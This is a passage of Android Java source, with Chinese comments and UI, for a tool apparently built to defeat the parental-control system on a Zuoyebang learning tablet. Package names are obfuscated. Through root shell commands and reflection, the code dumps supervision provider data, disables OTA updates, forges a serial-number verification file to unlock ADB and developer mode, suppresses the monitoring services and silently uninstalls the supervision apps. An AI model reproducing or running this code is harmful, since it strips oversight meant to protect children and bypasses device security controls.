            ipcRequest.put("sub_type", 3);
            ipcRequest.put("type", 2);
            ipcRequest.put("data", data);

            Intent intent = new Intent(Obfuscator.dec2(new byte[]{(byte)0x88, (byte)0x00, (byte)0x86, (byte)0x41, (byte)0x91, (byte)0x1a, (byte)0x84, (byte)0x16, (byte)0x8e, (byte)0x0d, (byte)0x8a, (byte)0x01, (byte)0x8c, (byte)0x41, (byte)0x82, (byte)0x00, (byte)0x9f, (byte)0x41, (byte)0x9b, (byte)0x1a, (byte)0x98, (byte)0x07}, (byte)0xeb, (byte)0x6f));
            intent.setPackage(Obfuscator.dec2(new byte[]{(byte)0x59, (byte)0xe8, (byte)0x57, (byte)0xa9, (byte)0x40, (byte)0xf2, (byte)0x55, (byte)0xfe, (byte)0x5f, (byte)0xe5, (byte)0x5b, (byte)0xe9, (byte)0x5d, (byte)0xa9, (byte)0x53, (byte)0xe8, (byte)0x4e, (byte)0xa9, (byte)0x4a, (byte)0xe6, (byte)0x5e, (byte)0xa9, (byte)0x5b, (byte)0xf7, (byte)0x4a, (byte)0xf4, (byte)0x4e, (byte)0xe8, (byte)0x48, (byte)0xe2}, (byte)0x3a, (byte)0x87));
            intent.putExtra("response", ipcRequest.toString());
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            sendBroadcast(intent);
            appendLog("[+] 广播已发送 (msgId=" + msgId + ")");
            appendLog("[*] appstore 应开始下载并安装...");
        } catch (Exception e) {
            appendLog("[!] " + e.getMessage());
        }
    }

    // ==================== 功能6: 管控探针 (扫描SuperviseProvider) ====================

    private void doSuperviseProbe() {
        appendLog("---------- 管控探针 ----------");
        appendLog("[*] 扫描 SuperviseProvider...");

        final String[] paths = {Obfuscator.dec(new byte[]{(byte)0x68, (byte)0x26, (byte)0x23, (byte)0x31, (byte)0x26, (byte)0x29, (byte)0x24, (byte)0x22}, (byte)0x47), Obfuscator.dec(new byte[]{(byte)0xe7, (byte)0xac, (byte)0xa1, (byte)0xbb, (byte)0xa9, (byte)0xaa, (byte)0xa4, (byte)0xad}, (byte)0xc8), Obfuscator.dec(new byte[]{(byte)0x4e, (byte)0x0a, (byte)0x04, (byte)0x18, (byte)0x3e, (byte)0x17, (byte)0x00, (byte)0x0d, (byte)0x14, (byte)0x04}, (byte)0x61), Obfuscator.dec(new byte[]{(byte)0x97, (byte)0xdf, (byte)0xca, (byte)0xd9, (byte)0xdc, (byte)0xdd}, (byte)0xb8), Obfuscator.dec(new byte[]{(byte)0xbf, (byte)0xff, (byte)0xe0, (byte)0xf5, (byte)0xfe, (byte)0xcf, (byte)0xf3, (byte)0xf8, (byte)0xf9, (byte)0xfc, (byte)0xf4, (byte)0xcf, (byte)0xfc, (byte)0xf9, (byte)0xe3, (byte)0xe4}, (byte)0x90), Obfuscator.dec(new byte[]{(byte)0x59, (byte)0x03, (byte)0x05, (byte)0x13, (byte)0x04, (byte)0x29, (byte)0x15, (byte)0x13, (byte)0x18, (byte)0x02, (byte)0x13, (byte)0x04}, (byte)0x76)};
        final StringBuilder sb = new StringBuilder();

        new Thread(new Runnable() {
            @Override
            public void run() {
                for (String path : paths) {
                    try {
                        Uri uri = Uri.parse(Obfuscator.dec3(new byte[]{(byte)0xb0, (byte)0xb0, (byte)0x57, (byte)0xa7, (byte)0xba, (byte)0x57, (byte)0xa7, (byte)0xe5, (byte)0x16, (byte)0xfc, (byte)0xbc, (byte)0x56, (byte)0xbe, (byte)0xf1, (byte)0x43, (byte)0xa6, (byte)0xb0, (byte)0x40, (byte)0xb6, (byte)0xbd, (byte)0x58, (byte)0xbd, (byte)0xb8, (byte)0x17, (byte)0xba, (byte)0xb0, (byte)0x4d, (byte)0xfd, (byte)0xaf, (byte)0x58, (byte)0xb7, (byte)0xf1, (byte)0x4a, (byte)0xa6, (byte)0xaf, (byte)0x5c, (byte)0xa1, (byte)0xa9, (byte)0x50, (byte)0xa0, (byte)0xba}, (byte)0xd3, (byte)0xdf, (byte)0x39) + path);
                        android.database.Cursor c = null;
                        try {
                            c = getContentResolver().query(uri, null, null, null, null);
                        } catch (Exception e) {
                            // try alternate
                        }
                        if (c == null) {
                            try {
                                Uri spUri = Uri.parse(Obfuscator.dec3(new byte[]{(byte)0xb0, (byte)0xb0, (byte)0x57, (byte)0xa7, (byte)0xba, (byte)0x57, (byte)0xa7, (byte)0xe5, (byte)0x16, (byte)0xfc, (byte)0xbc, (byte)0x56, (byte)0xbe, (byte)0xf1, (byte)0x43, (byte)0xa6, (byte)0xb0, (byte)0x40, (byte)0xb6, (byte)0xbd, (byte)0x58, (byte)0xbd, (byte)0xb8, (byte)0x17, (byte)0xba, (byte)0xb0, (byte)0x4d, (byte)0xfd, (byte)0xaf, (byte)0x58, (byte)0xb7, (byte)0xf1, (byte)0x4a, (byte)0xa6, (byte)0xaf, (byte)0x5c, (byte)0xa1, (byte)0xa9, (byte)0x50, (byte)0xa0, (byte)0xba}, (byte)0xd3, (byte)0xdf, (byte)0x39) + path);
                                c = getContentResolver().query(spUri, new String[]{"key", "value"}, null, null, null);
                            } catch (Exception e2) { }
                        }

                        if (c != null) {
                            sb.append("\n[").append(path).append("] ");
                            int count = c.getCount();
                            sb.append(count).append(" 行\n");
                            if (c.moveToFirst()) {
                                String[] cols = c.getColumnNames();
                                sb.append("  列: ");
                                for (String col : cols) sb.append(col).append(", ");
                                sb.append("\n");
                                int rows = 0;
                                do {
                                    if (rows < 10) {
                                        sb.append("  ");
                                        for (int i = 0; i < cols.length; i++) {
                                            try {
                                                sb.append(cols[i]).append("=").append(c.getString(i)).append(" | ");
                                            } catch (Exception e) { }
                                        }
                                        sb.append("\n");
                                    }
                                    rows++;
                                } while (c.moveToNext());
                                if (rows > 10) sb.append("  ... 共 ").append(rows).append(" 行\n");
                            }
                            c.close();
                            appendLog("[+] " + path + ": " + count + " 行");
                        } else {
                            appendLog("[!] " + path + ": 无法访问");
                        }
                    } catch (Exception e) {
                        appendLog("[!] " + path + ": " + e.getMessage());
                    }
                }

                // 也尝试反射方式读取
                try {
                    Method getSuperviseConfig = findMethod("getSuperviseConfig");
                    if (getSuperviseConfig != null) {
                        Object result = getSuperviseConfig.invoke(zybosService);
                        appendLog("[+] 反射 getSuperviseConfig: " + (result != null ? result.toString() : "null"));
                    }
                } catch (Exception e) { }

                showResultDialog("管控探针", sb.toString().trim());
                appendLog("---------- 探针完成 ----------");
            }
        }).start();
    }

    // ==================== 功能7: OTA管理 (扫描OTA Provider) ====================

    private void doOtaManager() {
        if (!checkAvailable()) return;

        new AlertDialog.Builder(this)
            .setTitle("OTA管理")
            .setItems(new String[]{
                "📋 扫描OTA Provider",
                "🚫 禁用自动更新",
                "✅ 启用自动更新",
                "❌ 取消正在进行的更新"
            }, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int which) {
                    switch (which) {
                        case 0: scanOtaProvider(); break;
                        case 1: setOtaAutoUpdate(false); break;
                        case 2: setOtaAutoUpdate(true); break;
                        case 3: doCancelUpdate(); break;
                    }
                }
            })
            .show();
    }

    private void scanOtaProvider() {
        appendLog("[*] 扫描OTA Provider...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                String[] otaPaths = {
                    Obfuscator.dec3(new byte[]{(byte)0xa0, (byte)0x12, (byte)0x06, (byte)0xb7, (byte)0x18, (byte)0x06, (byte)0xb7, (byte)0x47, (byte)0x47, (byte)0xec, (byte)0x1e, (byte)0x07, (byte)0xae, (byte)0x53, (byte)0x12, (byte)0xb6, (byte)0x12, (byte)0x11, (byte)0xa6, (byte)0x1f, (byte)0x09, (byte)0xad, (byte)0x1a, (byte)0x46, (byte)0xaa, (byte)0x12, (byte)0x1c, (byte)0xed, (byte)0x07, (byte)0x18, (byte)0xed, (byte)0x11, (byte)0x01, (byte)0xa1, (byte)0x53, (byte)0x07, (byte)0xb7, (byte)0x1c, (byte)0x46, (byte)0xb0, (byte)0x18, (byte)0x1a, (byte)0xb5, (byte)0x18, (byte)0x1a, (byte)0xec, (byte)0x12, (byte)0x1c, (byte)0xa2, (byte)0x22, (byte)0x0b, (byte)0xac, (byte)0x13, (byte)0x0e, (byte)0xaa, (byte)0x1a}, (byte)0xc3, (byte)0x7d, (byte)0x68),
                    Obfuscator.dec3(new byte[]{(byte)0x3b, (byte)0x57, (byte)0x26, (byte)0x2c, (byte)0x5d, (byte)0x26, (byte)0x2c, (byte)0x02, (byte)0x67, (byte)0x77, (byte)0x5b, (byte)0x27, (byte)0x35, (byte)0x16, (byte)0x32, (byte)0x2d, (byte)0x57, (byte)0x31, (byte)0x3d, (byte)0x5a, (byte)0x29, (byte)0x36, (byte)0x5f, (byte)0x66, (byte)0x31, (byte)0x57, (byte)0x3c, (byte)0x76, (byte)0x42, (byte)0x38, (byte)0x76, (byte)0x54, (byte)0x21, (byte)0x3a, (byte)0x16, (byte)0x27, (byte)0x2c, (byte)0x59, (byte)0x66, (byte)0x2b, (byte)0x5d, (byte)0x3a, (byte)0x2e, (byte)0x5d, (byte)0x3a, (byte)0x77, (byte)0x4d, (byte)0x38, (byte)0x3c, (byte)0x59, (byte)0x3c, (byte)0x3d, (byte)0x67, (byte)0x3b, (byte)0x2c, (byte)0x59, (byte)0x3c, (byte)0x2d, (byte)0x4b}, (byte)0x58, (byte)0x38, (byte)0x48),
                    Obfuscator.dec3(new byte[]{(byte)0xb7, (byte)0x08, (byte)0x45, (byte)0xa0, (byte)0x02, (byte)0x45, (byte)0xa0, (byte)0x5d, (byte)0x04, (byte)0xfb, (byte)0x04, (byte)0x44, (byte)0xb9, (byte)0x49, (byte)0x51, (byte)0xa1, (byte)0x08, (byte)0x52, (byte)0xb1, (byte)0x05, (byte)0x4a, (byte)0xba, (byte)0x00, (byte)0x05, (byte)0xbd, (byte)0x08, (byte)0x5f, (byte)0xfa, (byte)0x1d, (byte)0x5b, (byte)0xfa, (byte)0x0b, (byte)0x42, (byte)0xb6, (byte)0x49, (byte)0x44, (byte)0xa0, (byte)0x06, (byte)0x05, (byte)0xa7, (byte)0x02, (byte)0x59, (byte)0xa2, (byte)0x02, (byte)0x59, (byte)0xfb, (byte)0x08, (byte)0x5f, (byte)0xb5, (byte)0x38, (byte)0x47, (byte)0xbb, (byte)0x00}, (byte)0xd4, (byte)0x67, (byte)0x2b)
                };
                for (String uriStr : otaPaths) {
                    try {
                        Uri uri = Uri.parse(uriStr);
                        android.database.Cursor c = getContentResolver().query(uri, null, null, null, null);
                        if (c != null) {
                            appendLog("[+] " + uriStr + ": " + c.getCount() + " 行");
                            if (c.moveToFirst()) {
                                String[] cols = c.getColumnNames();
                                do {
                                    StringBuilder row = new StringBuilder("  ");
                                    for (int i = 0; i < cols.length; i++) {
                                        try {
                                            row.append(cols[i]).append("=").append(c.getString(i)).append(" | ");
                                        } catch (Exception e) { }
                                    }
                                    appendLog(row.toString());
                                } while (c.moveToNext());
                            }
                            c.close();
                        } else {
                            appendLog("[!] " + uriStr + ": 无法访问");
                        }
                    } catch (Exception e) {
                        appendLog("[!] " + uriStr + ": " + e.getMessage());
                    }
                }

                // 也尝试反射
                try {
                    Method getOtaConfig = findMethod("getOtaConfig");
                    if (getOtaConfig != null) {
                        Object result = getOtaConfig.invoke(zybosService);
                        appendLog("[+] 反射 getOtaConfig: " + (result != null ? result.toString() : "null"));
                    }
                } catch (Exception e) { }

                appendLog("[*] OTA扫描完成");
            }
        }).start();
    }

    private void setOtaAutoUpdate(final boolean enabled) {
        appendLog("[*] 设置自动更新: " + (enabled ? "启用" : "禁用"));
        runAsync(new Runnable() {
            @Override
            public void run() {
                try {
                    Method setOtaAutoUpdate = findMethod("setOtaAutoUpdate", Boolean.TYPE);
                    if (setOtaAutoUpdate != null) {
                        setOtaAutoUpdate.invoke(zybosService, enabled);
                        appendLog("[+] setOtaAutoUpdate(" + enabled + ") 已调用");
                        runOnUiThread(new Runnable() {
                            @Override public void run() { showSnack("✓ 自动更新已" + (enabled ? "启用" : "禁用")); }
                        });
                    } else {
                        appendLog("[!] setOtaAutoUpdate 未找到");
                        runOnUiThread(new Runnable() {
                            @Override public void run() { showSnack("✗ 方法未找到"); }
                        });
                    }
                } catch (Throwable e) {
                    final String err = e.getMessage();
                    appendLog("[!] 设置失败: " + (err != null ? err : e.getClass().getSimpleName()));
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("✗ 设置失败"); }
                    });
                }
            }
        });
    }

    // ==================== 功能8: 开发者入口 (三种方式) ====================

    private void doDevEntry() {
        new AlertDialog.Builder(this)
            .setTitle("开发者入口")
            .setItems(new String[]{
                "🔓 免Root开开发者 (卸载更新+验证)",
                "🔑 进入开发者验证框 (无需Root)",
                "⚡ 一键开启开发者模式 (需Root)"
            }, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int which) {
                    switch (which) {
                        case 0: doDevEntryNoRoot(); break;
                        case 1: launchDevVerification(); break;
                        case 2: doEnableDeveloperRoot(); break;
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void doDevEntryNoRoot() {
        new AlertDialog.Builder(this)
            .setTitle("免Root开开发者")
            .setMessage("操作步骤:\n\n" +
                "1. 系统会弹出个人中心的卸载界面\n" +
                "2. 点击「卸载更新」恢复出厂版本\n" +
                "3. 等待几秒后自动弹出开发者验证框\n" +
                "4. 输入验证码即可开启开发者模式\n\n" +
                "注意：卸载更新后个人中心数据可能需要重新登录")
            .setPositiveButton("确认执行", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    try {
                        Intent i = new Intent("android.intent.action.DELETE");
                        i.setData(Uri.parse("package:com.zuoyebang.iot.pad.zpusercenter"));
                        startActivity(i);
                        appendLog("[*] 已打开卸载界面");

                        new AlertDialog.Builder(ZybosToolsActivity.this)
                            .setTitle("下一步")
                            .setMessage("请先在上方卸载界面中\n点击「卸载更新」\n\n完成后点击下方按钮打开验证框")
                            .setPositiveButton("打开验证框", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface d2, int w2) {
                                    launchDevVerification();
                                }
                            })
                            .setNegativeButton("取消", null)
                            .setCancelable(false)
                            .show();
                    } catch (Exception e) {
                        appendLog("[!] 打开卸载界面失败: " + e.getMessage());
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void launchDevVerification() {
        try {
            Intent i = new Intent(Obfuscator.dec3(new byte[]{(byte)0x11, (byte)0x39, (byte)0x90, (byte)0x5c, (byte)0x2c, (byte)0x88, (byte)0x1d, (byte)0x2f, (byte)0x98, (byte)0x10, (byte)0x37, (byte)0x93, (byte)0x15, (byte)0x78, (byte)0x94, (byte)0x1d, (byte)0x22, (byte)0xd3, (byte)0x02, (byte)0x37, (byte)0x99, (byte)0x5c, (byte)0x32, (byte)0x98, (byte)0x04, (byte)0x33, (byte)0x91, (byte)0x1d, (byte)0x26, (byte)0x98, (byte)0x00, (byte)0x78, (byte)0x8f, (byte)0x17, (byte)0x27, (byte)0x88, (byte)0x17, (byte)0x25, (byte)0x89}, (byte)0x72, (byte)0x56, (byte)0xfd));
            i.setPackage(Obfuscator.dec2(new byte[]{(byte)0x7a, (byte)0xb0, (byte)0x74, (byte)0xf1, (byte)0x63, (byte)0xaa, (byte)0x76, (byte)0xa6, (byte)0x7c, (byte)0xbd, (byte)0x78, (byte)0xb1, (byte)0x7e, (byte)0xf1, (byte)0x70, (byte)0xb0, (byte)0x6d, (byte)0xf1, (byte)0x69, (byte)0xbe, (byte)0x7d, (byte)0xf1, (byte)0x63, (byte)0xaf, (byte)0x6c, (byte)0xac, (byte)0x7c, (byte)0xad, (byte)0x7a, (byte)0xba, (byte)0x77, (byte)0xab, (byte)0x7c, (byte)0xad}, (byte)0x19, (byte)0xdf));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            appendLog("[*] 已打开开发者验证页面");
        } catch (Exception e) {
            appendLog("[!] 验证页面打开失败: " + e.getMessage());
            showSnack("验证页面不可用（当前固件版本可能不支持）");
        }
    }

    private void doEnableDeveloperRoot() {
        new AlertDialog.Builder(this)
            .setTitle("一键开启开发者模式")
            .setMessage("需要Root权限执行以下操作:\n\n" +
                "1. 生成SN验证文件\n" +
                "2. 开启 special_enable_adb_debug\n" +
                "3. 开启 development_settings_enabled\n" +
                "4. 设置 sys.allow.development=true\n" +
                "5. 打开开发者选项页面\n\n" +
                "确定执行?")
            .setPositiveButton("执行", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    appendLog("[*] 一键开启开发者模式...");
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            execRoot("echo -n '3'$(getprop persist.sys.serialno) | md5sum | awk '{print $1}' > /sdcard/adb_special_enable.xml");
                            execRoot("settings put global special_enable_adb_debug 1");
                            execRoot("settings put global development_settings_enabled 1");
                            execRoot("setprop sys.allow.development true");
                            appendLog("[+] 命令已执行");
                            execRoot("am start -n com.android.settings/.SettingsActivity -a android.intent.action.MAIN -f 0x10000000 -e :settings:show_fragment com.android.settings.development.DevelopmentSettingsDashboardFragment");
                            runOnUiThread(new Runnable() {
                                @Override public void run() { showSnack("✓ 开发者模式已开启"); }
                            });
                        }
                    }).start();
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    // ==================== 功能9: 开发者磁贴 ====================

    private void doDevTile() {
        appendLog("[*] 跳转开发者磁贴...");
        try {
            Intent i = new Intent();
            i.setComponent(new ComponentName(Obfuscator.dec2(new byte[]{(byte)0xd7, (byte)0xae, (byte)0xd9, (byte)0xef, (byte)0xd5, (byte)0xaf, (byte)0xd0, (byte)0xb3, (byte)0xdb, (byte)0xa8, (byte)0xd0, (byte)0xef, (byte)0xc7, (byte)0xa4, (byte)0xc0, (byte)0xb5, (byte)0xdd, (byte)0xaf, (byte)0xd3, (byte)0xb2}, (byte)0xb4, (byte)0xc1), Obfuscator.dec2(new byte[]{(byte)0xc2, (byte)0xef, (byte)0xcc, (byte)0xae, (byte)0xc0, (byte)0xee, (byte)0xc5, (byte)0xf2, (byte)0xce, (byte)0xe9, (byte)0xc5, (byte)0xae, (byte)0xd2, (byte)0xe5, (byte)0xd5, (byte)0xf4, (byte)0xc8, (byte)0xee, (byte)0xc6, (byte)0xf3, (byte)0x8f, (byte)0xda, (byte)0xd8, (byte)0xe2, (byte)0xf2, (byte)0xe5, (byte)0xd5, (byte)0xf4, (byte)0xc8, (byte)0xee, (byte)0xc6, (byte)0xf3}, (byte)0xa1, (byte)0x80)));
            i.putExtra(":settings:show_fragment", Obfuscator.dec3(new byte[]{(byte)0x59, (byte)0x1f, (byte)0x5d, (byte)0x14, (byte)0x11, (byte)0x5e, (byte)0x5e, (byte)0x02, (byte)0x5f, (byte)0x53, (byte)0x14, (byte)0x1e, (byte)0x49, (byte)0x15, (byte)0x44, (byte)0x4e, (byte)0x19, (byte)0x5e, (byte)0x5d, (byte)0x03, (byte)0x1e, (byte)0x5e, (byte)0x15, (byte)0x46, (byte)0x5f, (byte)0x1c, (byte)0x5f, (byte)0x4a, (byte)0x1d, (byte)0x55, (byte)0x54, (byte)0x04, (byte)0x1e, (byte)0x4b, (byte)0x03, (byte)0x44, (byte)0x53, (byte)0x1c, (byte)0x55, (byte)0x14, (byte)0x34, (byte)0x55, (byte)0x4c, (byte)0x15, (byte)0x5c, (byte)0x55, (byte)0x00, (byte)0x5d, (byte)0x5f, (byte)0x1e, (byte)0x44, (byte)0x6e, (byte)0x19, (byte)0x5c, (byte)0x5f, (byte)0x33, (byte)0x5f, (byte)0x54, (byte)0x16, (byte)0x59, (byte)0x5d, (byte)0x36, (byte)0x42, (byte)0x5b, (byte)0x17, (byte)0x5d, (byte)0x5f, (byte)0x1e, (byte)0x44}, (byte)0x3a, (byte)0x70, (byte)0x30));
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            appendLog("[+] 开发者磁贴已跳转");
        } catch (Exception e) {
            appendLog("[!] 开发者磁贴: " + e.getMessage());
            showSnack("无法打开开发者磁贴");
        }
    }

    // ==================== 功能10: 后台管控 (DuraSpeed) ====================

    private void doBgManager() {
        new AlertDialog.Builder(this)
            .setTitle("后台管控 (DuraSpeed)")
            .setItems(new String[]{
                "❤️ 保活 JC Code (加入白名单)",
                "🛡️ 抑制 ZYB 监控服务",
                "📊 查看当前状态"
            }, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int which) {
                    switch (which) {
                        case 0: keepAliveApps(); break;
                        case 1: suppressZybServices(); break;
                        case 2: checkDuraSpeedStatus(); break;
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void keepAliveApps() {
        appendLog("[*] 保活: 添加DuraSpeed白名单...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                execRoot("cmd duraspeed addwhitelist " + getPackageName());
                execRoot("cmd duraspeed addwhitelist com.birchua.installer");
                appendLog("[+] 已添加白名单");
                runOnUiThread(new Runnable() {
                    @Override public void run() { showSnack("✓ 已加入后台白名单"); }
                });
            }
        }).start();
    }

    private void suppressZybServices() {
        appendLog("[*] 抑制ZYB监控服务...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                String[] targets = {
                    Obfuscator.dec2(new byte[]{(byte)0xfc, (byte)0x26, (byte)0xf2, (byte)0x67, (byte)0xe5, (byte)0x3c, (byte)0xf0, (byte)0x30, (byte)0xfa, (byte)0x2b, (byte)0xfe, (byte)0x27, (byte)0xf8, (byte)0x67, (byte)0xef, (byte)0x28, (byte)0xfb, (byte)0x24, (byte)0xec}, (byte)0x9f, (byte)0x49),
                    Obfuscator.dec2(new byte[]{(byte)0xa3, (byte)0x0b, (byte)0xad, (byte)0x4a, (byte)0xba, (byte)0x11, (byte)0xaf, (byte)0x1d, (byte)0xa5, (byte)0x06, (byte)0xa1, (byte)0x0a, (byte)0xa7, (byte)0x4a, (byte)0xa9, (byte)0x0b, (byte)0xb4, (byte)0x4a, (byte)0xb0, (byte)0x05, (byte)0xa4, (byte)0x4a, (byte)0xb3, (byte)0x11, (byte)0xb0, (byte)0x01, (byte)0xb2, (byte)0x12, (byte)0xa9, (byte)0x17, (byte)0xa5}, (byte)0xc0, (byte)0x64),
                    Obfuscator.dec2(new byte[]{(byte)0x8b, (byte)0xba, (byte)0x85, (byte)0xfb, (byte)0x92, (byte)0xa0, (byte)0x87, (byte)0xac, (byte)0x8d, (byte)0xb7, (byte)0x89, (byte)0xbb, (byte)0x8f, (byte)0xfb, (byte)0x81, (byte)0xba, (byte)0x9c, (byte)0xfb, (byte)0x92, (byte)0xa5, (byte)0x9c, (byte)0xb6, (byte)0x98, (byte)0xa6, (byte)0x8d, (byte)0xa7, (byte)0x9e, (byte)0xbc, (byte)0x8b, (byte)0xb0}, (byte)0xe8, (byte)0xd5)
                };
                for (String pkg : targets) {
                    execRoot("cmd duraspeed suppress " + pkg);
                    appendLog("[+] 已抑制: " + pkg);
                }
                runOnUiThread(new Runnable() {
                    @Override public void run() { showSnack("✓ 已抑制ZYB监控服务"); }
                });
            }
        }).start();
    }

    private void checkDuraSpeedStatus() {
        appendLog("[*] DuraSpeed状态...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                final String output = execRootCapture("cmd duraspeed status");
                appendLog("[*] DuraSpeed:\n" + output);
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        new AlertDialog.Builder(ZybosToolsActivity.this)
                            .setTitle("后台管控状态")
                            .setMessage(output)
                            .setPositiveButton("确定", null)
                            .show();
                    }
                });
            }
        }).start();
    }

    // ==================== 功能11: 系统应用卸载 (Root) ====================

    private void doSysAppUninstall() {
        if (!checkAvailable()) return;

        final EditText input = new EditText(this);
        input.setText(Obfuscator.dec2(new byte[]{(byte)0xa3, (byte)0x0b, (byte)0xad, (byte)0x4a, (byte)0xba, (byte)0x11, (byte)0xaf, (byte)0x1d, (byte)0xa5, (byte)0x06, (byte)0xa1, (byte)0x0a, (byte)0xa7, (byte)0x4a, (byte)0xa9, (byte)0x0b, (byte)0xb4, (byte)0x4a, (byte)0xb0, (byte)0x05, (byte)0xa4, (byte)0x4a, (byte)0xb3, (byte)0x11, (byte)0xb0, (byte)0x01, (byte)0xb2, (byte)0x12, (byte)0xa9, (byte)0x17, (byte)0xa5}, (byte)0xc0, (byte)0x64));
        input.setHint("输入系统应用包名");

        new AlertDialog.Builder(this)
            .setTitle("系统应用卸载 (Root)")
            .setMessage("⚠ 警告: 卸载系统应用可能导致系统不稳定!\n\n" +
                "可卸载的目标:\n" +
                "- zpsupervise（家长管控）\n" +
                "- zptcpservice（TCP通信）\n" +
                "- PadMS（超级管控）\n" +
                "- zpeyecare（护眼）\n\n" +
                "输入要卸载的包名:")
            .setView(input)
            .setPositiveButton("卸载", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    final String pkg = input.getText().toString().trim();
                    if (!pkg.isEmpty()) {
                        executeSysAppUninstall(pkg);
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void executeSysAppUninstall(final String pkgName) {
        appendLog("[*] 系统应用卸载: " + pkgName);

        new Thread(new Runnable() {
            @Override
            public void run() {
                // 先尝试反射方式
                try {
                    Method m = findMethod(Obfuscator.dec(new byte[]{(byte)0x6f, (byte)0x75, (byte)0x70, (byte)0x79, (byte)0x72, (byte)0x68, (byte)0x49, (byte)0x72, (byte)0x75, (byte)0x72, (byte)0x6f, (byte)0x68, (byte)0x7d, (byte)0x70, (byte)0x70, (byte)0x5d, (byte)0x6c, (byte)0x77}, (byte)0x1c), String.class, Boolean.TYPE);
                    if (m != null) {
                        m.invoke(zybosService, pkgName, true);  // true = 系统应用
                        appendLog("[+] silentUninstallApk(系统) 已调用");
                        runOnUiThread(new Runnable() {
                            @Override public void run() { showSnack("正在卸载系统应用..."); }
                        });
                        return;
                    }
                } catch (Throwable e) {
                    appendLog("[!] 反射方式失败: " + (e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName()));
                }

                // 回退: Root方式
                appendLog("[*] 尝试Root方式卸载...");
                final String result = execRootCapture("pm uninstall " + pkgName);
                appendLog("[+] pm uninstall 结果: " + result);
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        if (result.contains("Success") || result.contains("success")) {
                            showSnack("✓ 系统应用已卸载");
                        } else {
                            showSnack("✗ 卸载结果: " + result);
                        }
                    }
                });
            }
        }).start();
    }

    // ==================== 功能12: 降级安装 (Root pm install -d -r) ====================

    private void doRootDowngrade() {
        final EditText input = new EditText(this);
        input.setText("/storage/emulated/0/");
        input.setHint("输入APK路径");

        new AlertDialog.Builder(this)
            .setTitle("降级安装 (Root)")
            .setMessage("使用 pm install -d -r 降级安装APK\n需要Root权限\n\n输入APK文件路径:")
            .setView(input)
            .setPositiveButton("降级安装", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    final String path = input.getText().toString().trim();
                    if (path.isEmpty()) {
                        showSnack("请输入路径");
                        return;
                    }
                    appendLog("[*] Root降级安装: " + path);
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            final String result = execRootCapture("pm install -d -r '" + path + "'");
                            appendLog("[+] pm install -d 结果: " + result);
                            runOnUiThread(new Runnable() {
                                @Override public void run() {
                                    if (result.contains("Success")) {
                                        showSnack("✓ 降级安装成功");
                                    } else {
                                        showSnack("✗ " + result);
                                    }
                                }
                            });
                        }
                    }).start();
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    // ==================== 功能13: 清除appstore卡住状态 ====================

    private void clearAppstoreStuck() {
        appendLog("---------- 清除appstore卡住 ----------");
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // 1. 强制停止
                    Runtime.getRuntime().exec(new String[]{"am", "force-stop", Obfuscator.dec2(new byte[]{(byte)0x59, (byte)0xe8, (byte)0x57, (byte)0xa9, (byte)0x40, (byte)0xf2, (byte)0x55, (byte)0xfe, (byte)0x5f, (byte)0xe5, (byte)0x5b, (byte)0xe9, (byte)0x5d, (byte)0xa9, (byte)0x53, (byte)0xe8, (byte)0x4e, (byte)0xa9, (byte)0x4a, (byte)0xe6, (byte)0x5e, (byte)0xa9, (byte)0x5b, (byte)0xf7, (byte)0x4a, (byte)0xf4, (byte)0x4e, (byte)0xe8, (byte)0x48, (byte)0xe2}, (byte)0x3a, (byte)0x87)}).waitFor();
                    appendLog("[+] appstore 已强制停止");

                    // 2. 清除缓存
                    Runtime.getRuntime().exec(new String[]{"rm", "-rf", "/data/data/com.zuoyebang.iot.pad.appstore/cache/"}).waitFor();
                    appendLog("[+] appstore 缓存已清除");

                    // 3. 发送取消广播
                    try {
                        JSONObject data = new JSONObject();
                        data.put("type", 2);
                        data.put("sub_type", 0);
                        data.put("msg_id", "0000000000000000000");
                        data.put("pkg_name", Obfuscator.dec2(new byte[]{(byte)0x59, (byte)0xe8, (byte)0x57, (byte)0xa9, (byte)0x40, (byte)0xf2, (byte)0x55, (byte)0xfe, (byte)0x5f, (byte)0xe5, (byte)0x5b, (byte)0xe9, (byte)0x5d, (byte)0xa9, (byte)0x53, (byte)0xe8, (byte)0x4e, (byte)0xa9, (byte)0x4a, (byte)0xe6, (byte)0x5e, (byte)0xa9, (byte)0x5b, (byte)0xf7, (byte)0x4a, (byte)0xf4, (byte)0x4e, (byte)0xe8, (byte)0x48, (byte)0xe2}, (byte)0x3a, (byte)0x87));
